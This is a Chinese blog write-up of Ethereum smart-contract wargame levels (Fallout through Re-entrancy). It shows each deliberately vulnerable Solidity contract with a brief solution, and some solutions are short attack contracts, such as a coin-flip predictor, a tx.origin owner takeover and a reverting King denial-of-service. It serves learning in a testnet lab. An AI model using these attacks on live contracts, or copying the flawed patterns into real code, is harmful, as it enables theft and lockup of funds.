<li>以太坊主网即将进行合并，Rinkeby测试网络将于一年后停止运行，到时候就不知道这个靶场是否还会继续运行</li>
<li>不同版本的solidity语言特性不一样，可能会有兼容问题</li>
<li>Rinkeby的测试以太难以大量获取，做题不要一股脑把以太全塞进去了</li>
</ul>
<h1 id="1-Fallout"><a href="#1-Fallout" class="headerlink" title="1.Fallout"></a>1.Fallout</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">这很白痴是吧? 真实世界的合约必须安全的多, 难以入侵的多, 对吧?</span><br><span class="line"></span><br><span class="line">实际上... 也未必.</span><br><span class="line"></span><br><span class="line">Rubixi的故事在以太坊生态中非常知名. 这个公司把名字从 &#x27;Dynamic Pyramid&#x27; 改成 &#x27;Rubixi&#x27; 但是不知道怎么地, 他们没有把合约的 constructor 方法也一起更名:</span><br><span class="line"></span><br><span class="line">contract Rubixi &#123;</span><br><span class="line">  address private owner;</span><br><span class="line">  function DynamicPyramid() &#123; owner = msg.sender; &#125;</span><br><span class="line">  function collectAllFees() &#123; owner.transfer(this.balance) &#125;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">这让攻击者可以调用旧合约的constructor 然后获得合约的控制权, 然后再获得一些资产. 是的. 这些重大错误在智能合约的世界是有可能的.</span><br></pre></td></tr></table></figure>
<h2 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fallout</span> &#123;</span><br><span class="line">  </span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* constructor */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">Fal1out</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">    allocations[owner] = msg.<span class="property">value</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">	        <span class="built_in">require</span>(</span><br><span class="line">	            msg.<span class="property">sender</span> == owner,</span><br><span class="line">	            <span class="string">&quot;caller is not the owner&quot;</span></span><br><span class="line">	        );</span><br><span class="line">	        _;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocate</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">    allocations[msg.<span class="property">sender</span>] = allocations[msg.<span class="property">sender</span>].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sendAllocation</span>(<span class="params">address payable allocator</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(allocations[allocator] &gt; <span class="number">0</span>);</span><br><span class="line">    allocator.<span class="title function_">transfer</span>(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">collectAllocations</span>(<span class="params"></span>) public onlyOwner &#123;</span><br><span class="line">    msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allocatorBalance</span>(<span class="params">address allocator</span>) public view returns (uint) &#123;</span><br><span class="line">    <span class="keyword">return</span> allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解"><a href="#解" class="headerlink" title="解:"></a>解:</h2><p>扔到remix里面调用<code>Fal1out()</code>函数就行了</p>
<h1 id="2-Coin-Flip"><a href="#2-Coin-Flip" class="headerlink" title="2.Coin Flip"></a>2.Coin Flip</h1><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p>
<h2 id="合约代码-1"><a href="#合约代码-1" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">CoinFlip</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 <span class="variable constant_">FACTOR</span> = <span class="number">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    consecutiveWins = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">flip</span>(<span class="params">bool _guess</span>) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = <span class="title function_">uint256</span>(<span class="title function_">blockhash</span>(block.<span class="property">number</span>.<span class="title function_">sub</span>(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lastHash == blockValue) &#123;</span><br><span class="line">      <span class="title function_">revert</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.<span class="title function_">div</span>(<span class="variable constant_">FACTOR</span>);</span><br><span class="line">    bool side = coinFlip == <span class="number">1</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      consecutiveWins = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解-1"><a href="#解-1" class="headerlink" title="解:"></a>解:</h2><p>以太坊网络经典难题:熵的产生</p>
<p>使用区块哈希产生的随机数很容易被预测(只需要和它在同一个区块上就行了)，只需要写个中继合约打进去就行了（原来的合约基础之上改一点点就行了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function exp() public returns (bool) &#123;</span><br><span class="line">  uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">  if (lastHash == blockValue) &#123;</span><br><span class="line">    revert();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  lastHash = blockValue;</span><br><span class="line">  uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">  bool side = coinFlip == 1 ? true : false;</span><br><span class="line">  c = CoinFlip(targetAddress);</span><br><span class="line">  c.flip(side);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><strong>注意：</strong><br>在某些预测随机数的题目中会返还以太，经常出现<code>合约逻辑没有任何问题，但是就是运行出错</code>的问题。</p>
<p>当合约收到一个calldata为空的call时，receive函数会被调用。这个函数会在执行一些以太币转账操作时被执行，常见的以太币转账操作包括<code>.send()</code>、<code>.transfer()</code>函数发起的转账。如果没有receive函数存在，但是存在一个payable属性的fallback函数的话，这个fallback函数会在一次以太币转账中被调用。如果一个合约既没有receive函数也没有payable属性的fallback函数，那么这个合约不能通过常规的交易来接收以太币，并且会抛出一个异常。</p>
<h1 id="3-Telephone"><a href="#3-Telephone" class="headerlink" title="3.Telephone"></a>3.Telephone</h1><h2 id="合约代码-2"><a href="#合约代码-2" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解-2"><a href="#解-2" class="headerlink" title="解:"></a>解:</h2><p><code>tx.orgin</code>指的是交易的发起方，<code>msg.sender</code>是直接调用的一方，所以直接写合约调用这个函数就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">    function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line">    address targetAddr;</span><br><span class="line">    Telephone t;</span><br><span class="line">    address myaddr;</span><br><span class="line"></span><br><span class="line">    function setInstance(address _targetAddr,address _myaddr) public &#123;</span><br><span class="line">      targetAddr=_targetAddr;</span><br><span class="line">      myaddr= _myaddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp () public &#123;</span><br><span class="line">        t = Telephone(targetAddr);</span><br><span class="line">        t.changeOwner(myaddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="4-Token"><a href="#4-Token" class="headerlink" title="4.Token"></a>4.Token</h1><h2 id="合约代码-3"><a href="#合约代码-3" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解-3"><a href="#解-3" class="headerlink" title="解:"></a>解:</h2><p>很easy  溢出就完事了转个 <code>115792089237316195423570985008687907853269984665640564039457584007913129639935</code>就行了</p>
<h1 id="5-Delegation"><a href="#5-Delegation" class="headerlink" title="5. Delegation"></a>5. Delegation</h1><h2 id="合约代码-4"><a href="#合约代码-4" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解："><a href="#解：" class="headerlink" title="解："></a>解：</h2><p>老生常谈， delegatecall相当于是去目标合约那块把相关的函数代码复制过来运行，而在solidity是个编译型语言，且存储使用的是slot[]这个大数组，变量是写死在代码里面的，一旦目标合约的变量环境和当前合约的变量环境不一样，就出大事，这题都做烂了，懒得写了</p>
<h1 id="6-Force"><a href="#6-Force" class="headerlink" title="6.Force"></a>6.Force</h1><h2 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯</span><br><span class="line"></span><br><span class="line">这一关的目标是使合约的余额大于0</span><br></pre></td></tr></table></figure>

<h2 id="合约代码-5"><a href="#合约代码-5" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解：-1"><a href="#解：-1" class="headerlink" title="解："></a>解：</h2><p>在Solidity里面，有个很特殊的自毁函数<code> selfdestruct(addr);</code><br>随便写个合约，塞进去一个selfdestruct函数，然后指向题目</p>
<h1 id="7-Vault"><a href="#7-Vault" class="headerlink" title="7.Vault"></a>7.Vault</h1><h2 id="合约代码-6"><a href="#合约代码-6" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解-4"><a href="#解-4" class="headerlink" title="解"></a>解</h2><p>直接getStorageAt就行了，直接看</p>
<h1 id="8-King"><a href="#8-King" class="headerlink" title="8.King"></a>8.King</h1><h2 id="合约代码-7"><a href="#合约代码-7" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="解：-2"><a href="#解：-2" class="headerlink" title="解："></a>解：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    constructor(address payable target) public payable&#123;</span><br><span class="line">        require(msg.value == 0.15 ether,&quot;Not enough!&quot;);</span><br><span class="line">        target.call.gas(1000000).value(0.15 ether)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当submit题目打算回收“王权”时，它运行到king.transfer(msg.value);这一行时，由于king就是我们合约的地址，而我们合约的receive函数会执行revert，因此它会卡在这个状态无法执行，从而无法取回王权。</p>
<p>这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。</p>
<p>麻了，在写攻击合约的时候又踩坑里了<br><a target="_blank" rel="noopener" href="https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/">https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/</a></p>
<ul>
<li><p>transfer:要求接收的智能合约中必须有一个fallback或者receive函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误：</p>
<ul>
<li>付款方合约的余额不足，小于所要发送的value</li>
<li>接收方合约拒绝接收支付</li>
</ul>
</li>
<li><p>send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。</p>
</li>
<li><p>call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下:</p>
<p>  (bool success, bytes memory data) &#x3D; receivingAddress.call{value: 100}(“”);<br>  将参数设置为空会触发接收合约的fallback函数，使用call同样也可以调用本合约内的函数，形式如下<br>  (bool sent, bytes memory data) &#x3D; _to.call{gas :10000, value: msg.value}(byte4(keccack256(“function_name(uint256)”,args)));</p>
</li>
</ul>
<h1 id="9-Re-entrancy"><a href="#9-Re-entrancy" class="headerlink" title="9.Re-entrancy"></a>9.Re-entrancy</h1><h2 id="合约代码-8"><a href="#合约代码-8" class="headerlink" title="合约代码"></a>合约代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="解-5"><a href="#解-5" class="headerlink" title="解"></a>解</h2><p>合约在进行提币时，使用 require 依次判断提币账户是否拥有相应的资产，随后使用 msg.sender.<code>call</code>.value(amount)() 来发送 Ether，处理<code>完成</code>后相应修改用户资产数据。</p>
<p>首先，使用<code>call</code>进行转账是个比较危险的操作，因为<code>call</code>会将当前剩下的<code>gas</code>一并发过去执行</p>
</div><div class="index-category-tag">  <div class="level-item"><i class="fas fa-tags has-text-grey"> </i><a class="article-more button is-small link-muted index-tags" href="/tags/Solidity/">Solidity</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/ETH/">ETH</a><span> </span><a class="article-more button is-small link-muted index-tags" href="/tags/Blockchain/">Blockchain</a></div><hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-03  <a class="commentCountImg" href="/2022/10/03/RCE/#comment-container"><span class="display-none-class">ee3a51b7a6c437e5ede55c93ad7163f2</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="ee3a51b7a6c437e5ede55c93ad7163f2">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>12 分钟  <i class="fas fa-pencil-alt"> </i>1.8 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/10/03/RCE/">命令执行备忘录</a></h1><div class="content"><h1 id="0x00-什么是RCE"><a href="#0x00-什么是RCE" class="headerlink" title="0x00 什么是RCE"></a>0x00 什么是RCE</h1><p>RCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
